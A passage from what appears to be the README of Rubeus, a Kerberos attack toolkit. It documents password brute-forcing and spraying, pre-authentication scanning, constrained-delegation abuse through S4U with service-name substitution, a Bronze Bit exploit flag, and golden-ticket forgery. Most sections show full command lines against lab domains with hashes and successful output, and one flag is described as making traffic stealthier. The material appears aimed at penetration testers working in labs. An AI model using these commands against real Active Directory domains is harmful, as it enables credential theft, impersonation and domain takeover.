renewal\r\n    [*] Renewing TGT for dfm.a@TESTLAB.LOCAL\r\n\r\n    [*] Action: Renew TGT\r\n\r\n    [*] Using domain controller: PRIMARY.testlab.local (192.168.52.100)\r\n    [*] Building TGS-REQ renewal for: 'TESTLAB.LOCAL\\dfm.a'\r\n    [*] Connecting to 192.168.52.100:88\r\n    [*] Sent 1506 bytes\r\n    [*] Received 1510 bytes\r\n    [+] TGT renewal request successful!\r\n    [*] base64(ticket.kirbi):\r\n\r\n          doIFmjCCBZagAwIBBaEDAgEWoo...(snip)...\r\n\r\n\r\n### brute\r\n\r\nThe **brute** action will perform a Kerberos-based password bruteforcing or password spraying attack. **spray** can also be used as the action name.\r\n\r\n    C:\\Rubeus>Rubeus.exe brute /password:Password123!! /noticket\r\n\r\n       ______        _\r\n      (_____ \\      | |\r\n       _____) )_   _| |__  _____ _   _  ___\r\n      |  __  /| | | |  _ \\| ___ | | | |/___)\r\n      | |  \\ \\| |_| | |_) ) ____| |_| |___ |\r\n      |_|   |_|____/|____/|_____)____/(___/\r\n\r\n      v1.5.0\r\n\r\n    [-] Blocked/Disabled user => Guest\r\n    [-] Blocked/Disabled user => DefaultAccount\r\n    [-] Blocked/Disabled user => krbtgt\r\n    [-] Blocked/Disabled user => disabled\r\n    [+] STUPENDOUS => newuser:Password123!!\r\n    [*] base64(newuser.kirbi):\r\n\r\n          doIFLDCCBSigAwIBBaEDAgEWooIELDCCBChhggQkMIIEIKADAgEFoRAbDlR...(snip)...\r\n\r\n### preauthscan\r\n\r\nThe **preauthscan** action will send AS-REQ's for all usernames passed into the `/users` argument to discover accounts that do not require Kerberos pre-authentication.\r\n\r\n    C:\\Rubeus>Rubeus.exe preauthscan /users:uns.txt /domain:semperis.lab /dc:192.168.71.220\r\n\r\n       ______        _\r\n      (_____ \\      | |\r\n       _____) )_   _| |__  _____ _   _  ___\r\n      |  __  /| | | |  _ \\| ___ | | | |/___)\r\n      | |  \\ \\| |_| | |_) ) ____| |_| |___ |\r\n      |_|   |_|____/|____/|_____)____/(___/\r\n\r\n      v2.2.0\r\n\r\n    [*] Action: Scan for accounts not requiring Kerberos Pre-Authentication\r\n\r\n    [*] cclark: Pre-Auth Required\r\n    [*] jjones: Pre-Auth Not Required\r\n    [*] rwilliams: Pre-Auth Required\r\n    [*] svc_sqlserver: Pre-Auth Required\r\n    [*] pgreen: Pre-Auth Required\r\n    [*] jsmith: Pre-Auth Required\r\n    [*] tnahum: Pre-Auth Required\r\n    [*] sfederovsky: Pre-Auth Required\r\n\r\n## Constrained delegation abuse\r\n\r\nBreakdown of the constrained delegation commands:\r\n\r\n| Command     | Description |\r\n| ----------- | ----------- |\r\n| [s4u](#s4u) | Perform S4U2self and S4U2proxy actions |\r\n\r\n\r\n### s4u\r\n\r\nThe **s4u** action is nearly identical to [Kekeo](https://github.com/gentilkiwi/kekeo/)'s **tgs::s4u** functionality. If a user (or computer) account is configured for constrained delegation (i.e. has a SPN value in its msds-allowedtodelegateto field) this action can be used to abuse access to the target SPN/server. Constrained delegation is complex. For more information see [this post](http://www.harmj0y.net/blog/activedirectory/s4u2pwnage/) or Elad Shamir's [\"Wagging the Dog\"](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html) post.\r\n\r\nA **TL;DR** explanation is that an account with constrained delegation enabled is allowed to request tickets _to itself_ as any user, in a process known as S4U2self. In order for an account to be allowed to do this, it has to have **TrustedToAuthForDelegation** enabled in it's useraccountcontrol property, something that only elevated users can modify by default. This ticket has the **FORWARDABLE** flag set by default. The service can then use this specially requested ticket to request a service ticket to any service principal name (SPN) specified in the account's **msds-allowedtodelegateto** field. So long story short, if you have control of an account with **TrustedToAuthForDelegation** set and a value in **msds-allowedtodelegateto**, you can pretend to be any user in the domain to the SPNs set in the account's **msds-allowedtodelegateto** field.\r\n\r\nThis \"control\" can be the hash of the account (`/rc4` or `/aes256`), or an existing TGT (`/ticket:X`) for the account with a **msds-allowedtodelegateto** value set. If a `/user` and rc4/aes256 hash is supplied, the **s4u** module performs an [asktgt](#asktgt) action first, using the returned ticket for the steps following. If a TGT `/ticket:X` is supplied, that TGT is used instead.\r\n\r\nIf an account hash is supplied, the `/nopac` switch can be used to request the initial TGT without a PAC.\r\n\r\nUsing a KDC proxy ([MS-KKDCP](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-kkdcp/5bcebb8d-b747-4ee5-9453-428aec1c5c38)) to make the requests is possible using the `/proxyurl:URL` argument. The full URL for the KDC proxy is required, eg. https://kdcproxy.exmaple.com/kdcproxy. When used for the `s4u` command, *all* requests will be sent through the proxy.\r\n\r\nA `/impersonateuser:X` parameter **MUST** be supplied to the **s4u** module. If nothing else is supplied, just the S4U2self process is executed, returning a forwardable ticket:\r\n\r\n    C:\\Rubeus>Rubeus.exe s4u /user:patsy /rc4:2b576acbe6bcfda7294d6bd18041b8fe /impersonateuser:dfm.a\r\n\r\n     ______        _\r\n    (_____ \\      | |\r\n     _____) )_   _| |__  _____ _   _  ___\r\n    |  __  /| | | |  _ \\| ___ | | | |/___)\r\n    | |  \\ \\| |_| | |_) ) ____| |_| |___ |\r\n    |_|   |_|____/|____/|_____)____/(___/\r\n\r\n    v1.3.3\r\n\r\n    [*] Action: Ask TGT\r\n\r\n    [*] Using rc4_hmac hash: 2b576acbe6bcfda7294d6bd18041b8fe\r\n    [*] Using domain controller: PRIMARY.testlab.local (192.168.52.100)\r\n    [*] Building AS-REQ (w/ preauth) for: 'testlab.local\\patsy'\r\n    [*] Connecting to 192.168.52.100:88\r\n    [*] Sent 230 bytes\r\n    [*] Received 1377 bytes\r\n    [+] TGT request successful!\r\n    [*] base64(ticket.kirbi):\r\n\r\n        doIE+jCCBPagAwIBBaEDAgEWoo...(snip)...\r\n\r\n\r\n    [*] Action: S4U\r\n\r\n    [*] Using domain controller: PRIMARY.testlab.local (192.168.52.100)\r\n    [*] Building S4U2self request for: 'TESTLAB.LOCAL\\patsy'\r\n    [*] Sending S4U2self request\r\n    [*] Connecting to 192.168.52.100:88\r\n    [*] Sent 1437 bytes\r\n    [*] Received 1574 bytes\r\n    [+] S4U2self success!\r\n    [*] Got a TGS for 'dfm.a@TESTLAB.LOCAL' to 'TESTLAB.LOCAL\\patsy'\r\n    [*] base64(ticket.kirbi):\r\n\r\n        doIF2jCCBdagAwIBBaEDAgEWoo...(snip)...\r\n\r\nThat forwardable ticket can then be used as a `/tgs:Y` parameter (base64 blob or .kirbi file) to execute the S4U2proxy process. A valid **msds-allowedtodelegateto** value for the account must be supplied (`/msdsspn:X`). Say the **patsy@testlab.local** account looks like this:\r\n\r\n    PS C:\\> Get-DomainUser patsy -Properties samaccountname,msds-allowedtodelegateto | Select -Expand msds-allowedtodelegateto\r\n    ldap/PRIMARY.testlab.local/testlab.local\r\n    ldap/PRIMARY\r\n    ldap/PRIMARY.testlab.local/TESTLAB\r\n    ldap/PRIMARY/TESTLAB\r\n    ldap/PRIMARY.testlab.local/DomainDnsZones.testlab.local\r\n    ldap/PRIMARY.testlab.local/ForestDnsZones.testlab.local\r\n    ldap/PRIMARY.testlab.local\r\n\r\nThen the S4U2proxy abuse function (using the ticket from the previous S4U2self process) would be:\r\n\r\n    C:\\Rubeus>Rubeus.exe s4u /ticket:doIE+jCCBPagAwIBBaEDAgEWoo..(snip).. /msdsspn:\"ldap/PRIMARY.testlab.local\" /tgs:doIF2jCCBdagAwIBBaEDAgEWoo..(snip)..\r\n     ______        _\r\n    (_____ \\      | |\r\n     _____) )_   _| |__  _____ _   _  ___\r\n    |  __  /| | | |  _ \\| ___ | | | |/___)\r\n    | |  \\ \\| |_| | |_) ) ____| |_| |___ |\r\n    |_|   |_|____/|____/|_____)____/(___/\r\n\r\n    v1.3.3\r\n\r\n    [*] Action: S4U\r\n\r\n    [*] Loaded a TGS for TESTLAB.LOCAL\\dfm.a@TESTLAB.LOCAL\r\n    [*] Impersonating user 'dfm.a@TESTLAB.LOCAL' to target SPN 'ldap/PRIMARY.testlab.local'\r\n    [*] Using domain controller: PRIMARY.testlab.local (192.168.52.100)\r\n    [*] Building S4U2proxy request for service: 'ldap/PRIMARY.testlab.local'\r\n    [*] Sending S4U2proxy request\r\n    [*] Connecting to 192.168.52.100:88\r\n    [*] Sent 2641 bytes\r\n    [*] Received 1829 bytes\r\n    [+] S4U2proxy success!\r\n    [*] base64(ticket.kirbi) for SPN 'ldap/PRIMARY.testlab.local':\r\n\r\n        doIGujCCBragAwIBBaEDAgEWoo..(snip)..\r\n\r\nWhere `/ticket:X` is the TGT returned in the first step, and `/tgs` is the S4U2self ticket. Injecting the resulting ticket (manually with [Rubeus.exe ptt /ticket:X](#ptt) or by supplying the `/ptt` flag to the **s4u** command) will allow you access the **ldap** service on primary.testlab.local _as if you are dfm.a_. \r\n\r\nThe `/altservice` parameter takes advantage of [Alberto Solino](https://twitter.com/agsolino)'s great discovery about [how the service name (sname) is not protected in the KRB-CRED file](https://www.coresecurity.com/blog/kerberos-delegation-spns-and-more), only the server name is. This allows us to substitute in any service name we want in the resulting KRB-CRED (.kirbi) file. One or more alternate service names can be supplied, comma separated (`/altservice:cifs,HOST,...`).\r\n\r\nLet's expand on the previous example, forging access to the filesystem on **primary.testlab.local** by abusing its constrained delegation configuration and the alternate service substitution. Let's package it all into one step as well, performing a TGT request, S4U2self process, S4U2proxy execution, and injection of the final ticket:\r\n\r\n    C:\\Rubeus>dir \\\\primary.testlab.local\\C$\r\n    Access is denied.\r\n\r\n    C:\\Rubeus>Rubeus.exe s4u /user:patsy /rc4:2b576acbe6bcfda7294d6bd18041b8fe /impersonateuser:dfm.a /msdsspn:\"ldap/PRIMARY.testlab.local\" /altservice:cifs /ptt\r\n\r\n     ______        _\r\n    (_____ \\      | |\r\n     _____) )_   _| |__  _____ _   _  ___\r\n    |  __  /| | | |  _ \\| ___ | | | |/___)\r\n    | |  \\ \\| |_| | |_) ) ____| |_| |___ |\r\n    |_|   |_|____/|____/|_____)____/(___/\r\n\r\n    v1.3.3\r\n\r\n    [*] Action: Ask TGT\r\n\r\n    [*] Using rc4_hmac hash: 2b576acbe6bcfda7294d6bd18041b8fe\r\n    [*] Using domain controller: PRIMARY.testlab.local (192.168.52.100)\r\n    [*] Building AS-REQ (w/ preauth) for: 'testlab.local\\patsy'\r\n    [*] Connecting to 192.168.52.100:88\r\n    [*] Sent 230 bytes\r\n    [*] Received 1377 bytes\r\n    [+] TGT request successful!\r\n    [*] base64(ticket.kirbi):\r\n\r\n        doIE+jCCBPagAwIBBaEDAgEWoo..(snip)..\r\n\r\n\r\n    [*] Action: S4U\r\n\r\n    [*] Using domain controller: PRIMARY.testlab.local (192.168.52.100)\r\n    [*] Building S4U2self request for: 'TESTLAB.LOCAL\\patsy'\r\n    [*] Sending S4U2self request\r\n    [*] Connecting to 192.168.52.100:88\r\n    [*] Sent 1437 bytes\r\n    [*] Received 1574 bytes\r\n    [+] S4U2self success!\r\n    [*] Got a TGS for 'dfm.a@TESTLAB.LOCAL' to 'TESTLAB.LOCAL\\patsy'\r\n    [*] base64(ticket.kirbi):\r\n\r\n        doIF2jCCBdagAwIBBaEDAgEWoo..(snip)..\r\n\r\n    [*] Impersonating user 'dfm.a' to target SPN 'ldap/PRIMARY.testlab.local'\r\n    [*]   Final ticket will be for the alternate service 'cifs'\r\n    [*] Using domain controller: PRIMARY.testlab.local (192.168.52.100)\r\n    [*] Building S4U2proxy request for service: 'ldap/PRIMARY.testlab.local'\r\n    [*] Sending S4U2proxy request\r\n    [*] Connecting to 192.168.52.100:88\r\n    [*] Sent 2641 bytes\r\n    [*] Received 1829 bytes\r\n    [+] S4U2proxy success!\r\n    [*] Substituting alternative service name 'cifs'\r\n    [*] base64(ticket.kirbi) for SPN 'cifs/PRIMARY.testlab.local':\r\n\r\n        doIGujCCBragAwIBBaEDAgEWoo..(snip)..\r\n\r\n    [*] Action: Import Ticket\r\n    [+] Ticket successfully imported!\r\n\r\n    C:\\Rubeus>dir \\\\primary.testlab.local\\C$\r\n    Volume in drive \\\\primary.testlab.local\\C$ has no label.\r\n    Volume Serial Number is A48B-4D68\r\n\r\n    Directory of \\\\primary.testlab.local\\C$\r\n\r\n    07/05/2018  12:57 PM    <DIR>          dumps\r\n    03/05/2017  04:36 PM    <DIR>          inetpub\r\n    08/22/2013  07:52 AM    <DIR>          PerfLogs\r\n    04/15/2017  05:25 PM    <DIR>          profiles\r\n    08/28/2018  11:51 AM    <DIR>          Program Files\r\n    08/28/2018  11:51 AM    <DIR>          Program Files (x86)\r\n    10/09/2018  12:04 PM    <DIR>          Temp\r\n    08/23/2018  03:52 PM    <DIR>          Users\r\n    10/25/2018  01:15 PM    <DIR>          Windows\r\n                1 File(s)              9 bytes\r\n                9 Dir(s)  40,511,676,416 bytes free\r\n\r\nBy default, several differences exists between the S4U2Self and S4U2Proxy TGS-REQ's generated by Rubeus and genuine requests. To form the TGS-REQ's more inline with genuine requests, the `/opsec` flag can be used. As this flag is intended to make Rubeus traffic more stealthy, it cannot by default be used with any encryption type other than `aes256` and will just throw a warning and exit if another encryption type is used. To allow for other encryption types to be used with the `/opsec` changes, the `/force` flag exists. The `/opsec` flag has not yet been implemented for cross domain S4U.\r\n\r\nThe *Bronze Bit* exploit (CVE-2020-17049) is implemented using the `/bronzebit` flag. Adding this flag will automatically flip the *forwardable* flag when retreiving the S4U2Self ticket. As flipping this flag requires the service ticket to be decrypted and reencrypted, the long term key (service account's password hash) is required. For this reason, if a TGT is being supplied, the service accounts credentials are also required for this to work.\r\n\r\nIt is possible, in certain cirsumstances, to use an S4U2Self ticket to impersonate protected users in order to escalate privileges on the requesting system, as discussed [here](https://exploit.ph/revisiting-delegate-2-thyself.html). For this purpose, the `/self` flag and `/altservice:X` argument can be used to generate a usable service ticket.\r\n\r\nTo forge an S4U2Self referral, only the trust key is required. By using the `/targetdomain:X` argument with the `/self` flag and without the `/targetdc` argument, Rubeus will treat the ticket supplied with `/ticket:X` as an S4U2Self referral and only request the final S4U2Self service ticket. The `/altservice:X` can also be used to rewrite the sname in the resulting ticket:\r\n\r\n    C:\\Rubeus>Rubeus.exe s4u /self /targetdomain:internal.zeroday.lab /dc:idc1.internal.zeroday.lab /impersonateuser:external.admin /domain:external.zeroday.lab /altservice:host/isql1.internal.zeroday.lab /nowrap /ticket:C:\\temp\\s4u2self-referral.kirbi\r\n\r\n       ______        _\r\n      (_____ \\      | |\r\n       _____) )_   _| |__  _____ _   _  ___\r\n      |  __  /| | | |  _ \\| ___ | | | |/___)\r\n      | |  \\ \\| |_| | |_) ) ____| |_| |___ |\r\n      |_|   |_|____/|____/|_____)____/(___/\r\n\r\n      v1.5.0\r\n\r\n    [*] Action: S4U\r\n\r\n    [*] Action: S4U\r\n\r\n    [*] Using domain controller: idc1.internal.zeroday.lab (192.168.71.20)\r\n    [*] Requesting the cross realm 'S4U2Self' for external.admin@external.zeroday.lab from idc1.internal.zeroday.lab\r\n    [*] Sending cross realm S4U2Self request\r\n    [+] cross realm S4U2Self success!\r\n    [*] Substituting alternative service name 'host/isql1.internal.zeroday.lab'\r\n    [*] base64(ticket.kirbi):\r\n\r\n          doIFETCCBQ...RheS5sYWI=\r\n\r\n\r\n\r\n## Ticket Forgery\r\n\r\nBreakdown of the ticket forgery commands:\r\n\r\n| Command     | Description |\r\n| ----------- | ----------- |\r\n| [golden](#golden) | Forge an ticket granting ticket (TGT) |\r\n| [silver](#silver) | Forge a service ticket, can also forge TGTs |\r\n| [diamond](#diamond) | Forge a diamond ticket |\r\n\r\nThere are many similarities between the `golden` and `silver` commands, the reason for them being separate is to simplfy the `golden` command. Service tickets can be much more complex than TGTs with different keys and extra sections, while TGTs can be forged with the `silver` command, `golden` provides fewer potential arguments as the features not relevent to TGTs are not present.\r\n\r\nMost of the arguments for both of these commands are to set PAC fields and should be reasonably self explanitory. These are:\r\n\r\n| Argument | Description |\r\n|----------|-------------|\r\n| /user | Used as the user to query details for if `/ldap` is passed but also is used to set the EffectiveName field in the PAC and the cname field in the EncTicketPart |\r\n| /dc | Specifies the domain controller used for the LDAP query if `/ldap` is passed but also used to set the LogonServer field in the PAC |\r\n| /netbios | Sets the LogonDomainName field in the PAC |\r\n| /sid | Sets the LogonDomainId field in the PAC |\r\n| /id | Sets the UserId field in the PAC (Default: 500) |\r\n| /displayname | Sets the FullName field in the PAC |\r\n| /logoncount | Sets the LogonCount field in the PAC (Default: 0) |\r\n| /badpwdcount | Sets the BadPasswordCount field in the PAC (Default: 0) |\r\n| /uac | Sets the UAC field in the PAC (Default: NORMAL_ACCOUNT) |\r\n| /pgid | Sets the PrimaryGroupId field in the PAC and is also added to the `/groups` field (Default: 513) |\r\n| /groups | Comma separated. Sets the Groups field in the PAC, also has the `/pgid` added to it. The total is also used to calculate the GroupCount field (Default: 520,512,513,519,518) |\r\n| /homedir | Sets the HomeDirectory field in the PAC |\r\n| /homedrive | Sets the HomeDirectoryDrive field in the PAC |\r\n| /profilepath | Sets the ProfilePath field in the PAC |\r\n| /scriptpath | Sets the LogonScript field in the PAC |\r\n| /logofftime | Sets the LogoffTime field in the PAC. In local time format - Is converted to UTC automatically |\r\n| /lastlogon | Sets the LogonTime field in the PAC. In local time format - Is converted to UTC automatically (Default: starttime - 1 second) |\r\n| /passlastset | Sets the PasswordLastSet field in the PAC. In local time format - Is converted to UTC automatically |\r\n| /minpassage | Sets the PasswordCanChange field in the PAC. This is relative to PasswordLastSet, in number of days, so '5' for 5 days |\r\n| /maxpassage | Sets the PasswordMustChange field in the PAC. This is relative to PasswordLastSet, in number of days, so '5' for 5 days |\r\n| /sids | Comma separated. Sets the ExtraSIDs field in the PAC. It is also used to calculate the ExtraSIDCount field |\r\n| /resourcegroupsid | Sets the ResourceGroupSid field in the PAC. If used, `/resourcegroups` is also required |\r\n| /resourcegroups | Comma separated. Sets the ResourceGroups field in the PAC. It is also used to calculate the ResourceGroupCount field. If used, `/resourcegroupsid` is also required |\r\n\r\nOther arguments common to both commands but to set fields outside of the PAC are:\r\n\r\n| Argument | Description |\r\n|----------|-------------|\r\n| /authtime | Sets the authtime field in the EncTicketPart. In local time format - Is converted to UTC automatically (Default: now) |\r\n| /starttime | Sets the starttime field in the EncTicketPart. In local time format - Is converted to UTC automatically (Default: now) |\r\n| /endtime | Sets the endtime field in the EncTicketPart. This is relative to starttime, in the format of multiplier plus timerange, so for 5 days, 5d. More information on this format explained below (Default: 10h) |\r\n| /renewtill | Sets the renew-till field in the EncTicketPart. This is relative to starttime, in the format of multiplier plus timerange, so for 5 days, 5d. More information on this format explained below (Default: 7d) |\r\n| /rangeend | This is for creating multiple tickets that start at different times. This will be the last starttime, relative to `/starttime`, in the format of multiplier plus timerange, so for 5 days, 5d. More information on this format explained below |\r\n| /rangeinterval | This is for creating multiple tickets that starts are different times. This is the interval that will be used between each starttime, in the format of multiplier plus timerange, so for 5 days, 5d. More information on this format explained below |\r\n| /flags | Sets the ticket flags within the EncTicketPart (Default: forwardable,renewable,pre_authent and for `golden` also initial) |\r\n| /extendedupndns | Includes the new extended UpnDns (which includes the samaccountname and account SID) |\r\n\r\nFor the relative times described in the tables above, the format is an integer used as a multiplier followed by a single character which acts as a timerange. The meaning of each supported character is shown in the table below (**These are case sensitive**):\r\n\r\n| Character | Description |\r\n|-----------|-------------|\r\n| m | Minutes |\r\n| h | Hours |\r\n| d | Days |\r\n| M | Months |\r\n| y | Years |\r\n\r\nThe other common feature used by both commands is LDAP information retrieval. Both `golden` and `silver` support retrieving information over LDAP using the `/ldap` flag. The `/ldap` flag can be used with the `/creduser` and `credpassword` arguments to authenticate as an alternative user when retrieving this information. The inforamtion is retrieved by sending 3 LDAP queries and mounting the SYSVOL share of a domain controller (for reading the Domain policy file) if no other information is passed. LDAP queries will automatically be sent over TLS and fail back to plaintext LDAP if it fails.\r\n\r\nThe first LDAP query, which will always be sent if `ldap` is passed, queries for the user specified in `/user`, and retreives most of the users information required for the PAC.\r\n\r\nThe second LDAP query will be sent if `/groups`, `/pgid`, `/minpassage` **OR** `/maxpassage` are not given on the command line, any of these arguments given on the command line will avoid querying LDAP for the information. This query retrieves the groups that the user is a member of, including the primary group, along with the domain policy object (used to get the path to the policy file). If `/minpassage` or `/maxpassage` is not provided on the command line and the domain policy object is retrieved from LDAP, the SYSVOL share of a DC is mounted and the policy file is parsed to get the MinimumPasswordAge (to set the proper value for the PasswordCanChange field in the PAC) and the MaximumPasswordAge (to set the proper value for the PasswordMustChange field in the PAC) values.\r\n\r\nLastly, if the `/netbios` argument is not given on the command line, an LDAP query for the proper netbios name of the domain is made from the *Configuration* container in order to set the LogonDomainName field in the PAC. If the `/ldap` flag is not given on the command line and the `/netbios` argument also is not given, the first element (before the first period '.') is uppercased and used instead.\r\n\r\nThe `/printcmd` flag can be used to print the arguments required to generate another ticket containing the same PAC information used to generate the current ticket. This will **not** print arguments related to the times the ticket is valid for as those are likely required to be different for any future tickets you want to forge.\r\n\r\n### golden\r\n\r\nThe **golden** action will forge a TGT for the user `/user:X` encrypting the ticket with the hash passed with `/des:X`, `/rc4:X`, `/aes128:X` or `/aes256:X` and using the same key to create the ServerChecksum and KDCChecksum. The various arguments to set fields manually are described above or the `/ldap` flag can be used to automatically retrieve the information from the domain controller.\r\n\r\nThe `/oldpac` switch can be used to exclude the new *Requestor* and *Attributes* PAC_INFO_BUFFERs, added in response to CVE-2021-42287.\r\n\r\nThe `/extendedupndns` switch will include the new extended UpnDns elements. This involved adding _2_ to the Flags, as well as containing the samaccountname and account SID.\r\n\r\nThe `/rodcNumber:x` parameter was added to perform kerberos [Key List Requests](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-kile/732211ae-4891-40d3-b2b6-85ebd6f5ffff). The value of this parameter is the number specified after krbtgt_x the `msDS-KrbTgtLink` attribute of the read-only domain controller, eg. krbtgt_12345 would be 12345. This request requires certain flags which can be set using `/flags:forwardable,renewable,enc_pa_rep`. The key (`/des:X`, `/rc4:X`, `/aes128:X` or `/aes256:X`) used to encrypt is the KRBTGT_x accounts key. Further information can be found on Elad Shamir's blog post [here](https://posts.specterops.io/at-the-edge-of-tier-zero-the-curious-case-of-the-rodc-ef5f1799ca06), \r\n\r\nForging a TGT using the `/ldap` flag to retrieve the information and the `/printcmd` flag to print a command to forge another ticket with the same PAC information:\r\n\r\n    C:\\Rubeus>Rubeus.exe golden /aes256:6a8941dcb801e0bf63444b830e5faabec24b442118ec60def839fd47a10ae3d5 /ldap /user:harmj0y /printcmd\r\n\r\n       ______        _\r\n      (_____ \\      | |\r\n       _____) )_   _| |__  _____ _   _  ___\r\n      |  __  /| | | |  _ \\| ___ | | | |/___)\r\n      | |  \\ \\| |_| | |_) ) ____| |_| |___ |\r\n      |_|   |_|____/|____/|_____)____/(___/\r\n\r\n      v2.0.0\r\n\r\n    [*] Action: Build TGT\r\n\r\n    [*] Trying to query LDAP using LDAPS for user information on domain controller PDC1.rubeus.ghostpack.local\r\n    [*] Searching path 'DC=rubeus,DC=ghostpack,DC=local' for '(samaccountname=harmj0y)'\r\n    [*] Retrieving domain policy information over LDAP from domain controller PDC1.rubeus.ghostpack.local\r\n    [*] Searching path 'DC=rubeus,DC=ghostpack,DC=local' for '(|(objectsid=S-1-5-21-3237111427-1607930709-3979055039-513)(name={31B2F340-016D-11D2-945F-00C04FB984F9}))'\r\n    [*] Attempting to mount: \\\\pdc1.rubeus.ghostpack.local\\SYSVOL\r\n    [*] \\\\pdc1.rubeus.ghostpack.local\\SYSVOL successfully mounted\r\n    [*] Attempting to unmount: \\\\pdc1.rubeus.ghostpack.local\\SYSVOL\r\n    [*] \\\\pdc1.rubeus.ghostpack.local\\SYSVOL successfully unmounted\r\n    [*] Retrieving netbios name information over LDAP from domain controller PDC1.rubeus.ghostpack.local\r\n    [*] Searching path 'CN=Configuration,DC=rubeus,DC=ghostpack,DC=local' for '(&(netbiosname=*)(dnsroot=rubeus.ghostpack.local))'\r\n    [*] Building PAC\r\n\r\n    [*] Domain         : RUBEUS.GHOSTPACK.LOCAL (RUBEUS)\r\n    [*] SID            : S-1-5-21-3237111427-1607930709-3979055039\r\n    [*] UserId         : 1106\r\n    [*] Groups         : 513\r\n    [*] ServiceKey     : 6A8941DCB801E0BF63444B830E5FAABEC24B442118EC60DEF839FD47A10AE3D5\r\n    [*] ServiceKeyType : KERB_CHECKSUM_HMAC_SHA1_96_AES256\r\n    [*] KDCKey         : 6A8941DCB801E0BF63444B830E5FAABEC24B442118EC60DEF839FD47A10AE3D5\r\n    [*] KDCKeyType     : KERB_CHECKSUM_HMAC_SHA1_96_AES256\r\n    [*] Service        : krbtgt\r\n    [*] Target         : rubeus.ghostpack.local\r\n\r\n    [*] Generating EncTicketPart\r\n    [*] Signing PAC\r\n    [*] Encrypting EncTicketPart\r\n    [*] Generating Ticket\r\n    [*] Generated KERB-CRED\r\n    [*] Forged a TGT for 'harmj0y@rubeus.ghostpack.local'\r\n\r\n    [*] AuthTime       : 29/07/2021 00:12:40\r\n    [*] StartTime      : 29/07/2021 00:12:40\r\n    [*] EndTime        : 29/07/2021 10:12:40\r\n    [*] RenewTill      : 05/08/2021 00:12:40\r\n\r\n    [*] base64(ticket.kirbi):\r\n\r\n          doIFdTCCBXGgAwIBBaEDAgEWooIERDCCBEBhggQ8MIIEOKADAgEFoRgbFlJVQkVVUy5HSE9TVFBBQ0su\r\n                                            ...(snip)...\r\n          dWJldXMuZ2hvc3RwYWNrLmxvY2Fs\r\n    \r\n    \r\n    \r\n    [*] Printing a command to recreate a ticket containing the information used within this ticket\r\n\r\n    C:\\Rubeus\\Rubeus.exe golden /aes256:6A8941DCB801E0BF63444B830E5FAABEC24B442118EC60DEF839FD47A10AE3D5 /user:harmj0y /id:1106 /pgid:513 /domain:rubeus.ghostpack.local /sid:S-1-5-21-3237111427-1607930709-3979055039 /pwdlastset:\"14/07/2021 02:07:12\" /minpassage:1 /logoncount:16 /displayname:\"Harm J0y\" /netbios:RUBEUS /groups:513 /dc:PDC1.rubeus.ghostpack.local /uac:NORMAL_ACCOUNT,DONT_EXPIRE_PASSWORD,NOT_DELEGATED\r\n\r\nForging a TGT, explicitly setting everything on the command line:\r\n\r\n    C:\\Rubeus>Rubeus.exe golden /aes256:6A8941DCB801E0BF63444B830E5FAABEC24B442118EC60DEF839FD47A10AE3D5 /user:harmj0y /id:1106 /pgid:513 /domain:rubeus.ghostpack.local /sid:S-1-5-21-3237111427-1607930709-3979055039 /pwdlastset:\"14/07/2021 02:07:12\" /minpassage:1 /logoncount:16 /displayname:\"Harm J0y\" /netbios:RUBEUS /groups:513 /dc:PDC1.rubeus.ghostpack.local /uac:NORMAL_ACCOUNT,DONT_EXPIRE_PASSWORD,NOT_DELEGATED\r\n\r\n       ______        _\r\n      (_____ \\      | |\r\n       _____) )_   _| |__  _____ _   _  ___\r\n      |  __  /| | | |  _ \\| ___ | | | |/___)\r\n      | |  \\ \\| |_| | |_) ) ____| |_| |___ |\r\n      |_|   |_|____/|____/|_____)____/(___/\r\n\r\n      v2.0.0\r\n\r\n    [*] Action: Build TGT\r\n\r\n    [*] Building PAC\r\n\r\n    [*] Domain         : RUBEUS.GHOSTPACK.LOCAL (RUBEUS)\r\n    [*] SID            : S-1-5-21-3237111427-1607930709-3979055039\r\n    [*] UserId         : 1106\r\n    [*] Groups         : 513\r\n    [*] ServiceKey     : 6A8941DCB801E0BF63444B830E5FAABEC24B442118EC60DEF839FD47A10AE3D5\r\n    [*] ServiceKeyType : KERB_CHECKSUM_HMAC_SHA1_96_AES256\r\n    [*] KDCKey         : 6A8941DCB801E0BF63444B830E5FAABEC24B442118EC60DEF839FD47A10AE3D5\r\n    [*] KDCKeyType     : KERB_CHECKSUM_HMAC_SHA1_96_AES256\r\n    [*] Service        : krbtgt\r\n    [*] Target         : rubeus.ghostpack.local\r\n\r\n    [*] Generating EncTicketPart\r\n    [*] Signing PAC\r\n    [*] Encrypting EncTicketPart\r\n    [*] Generating Ticket\r\n    [*] Generated KERB-CRED\r\n    [*] Forged a TGT for 'harmj0y@rubeus.ghostpack.local'\r\n\r\n    [*] AuthTime       : 29/07/2021 00:18:19\r\n    [*] StartTime      : 29/07/2021 00:18:19\r\n    [*] EndTime        : 29/07/2021 10:18:19\r\n    [*] RenewTill      : 05/08/2021 00:18:19\r\n\r\n    [*] base64(ticket.kirbi):\r\n\r\n          doIFdTCCBXGgAwIBBaEDAgEWooIERDCCBEBhggQ8MIIEOKADAgEFoRgbFlJVQkVVUy5HSE9TVFBBQ0su\r\n                                            ...(snip)...\r\n          dWJldXMuZ2hvc3RwYWNrLmxvY2Fs\r\n\r\nForging 5 TGTs starting on different days with 1 day interval between starttimes, with the first starting now, and using LDAP to get the PAC information:\r\n\r\n    C:\\Rubeus>Rubeus.exe golden /aes256:6a8941dcb801e0bf63444b830e5faabec24b442118ec60def839fd47a10ae3d5 /ldap /user:harmj0y /rangeend:5d /rangeinterval:1d\r\n\r\n       ______        _\r\n      (_____ \\      | |\r\n       _____) )_   _| |__  _____ _   _  ___\r\n      |  __  /| | | |  _ \\| ___ | | | |/___)\r\n      | |  \\ \\| |_| | |_) ) ____| |_| |___ |\r\n      |_|   |_|____/|____/|_____)____/(___/\r\n\r\n      v2.0.0\r\n\r\n    [*] Action: Build TGT\r\n\r\n    [*] Trying to query LDAP using LDAPS for user information on domain controller PDC1.rubeus.ghostpack.local\r\n    [*] Searching path 'DC=rubeus,DC=ghostpack,DC=local' for '(samaccountname=harmj0y)'\r\n    [*] Retrieving domain policy information over LDAP from domain controller PDC1.rubeus.ghostpack.local\r\n    [*] Searching path 'DC=rubeus,DC=ghostpack,DC=local' for 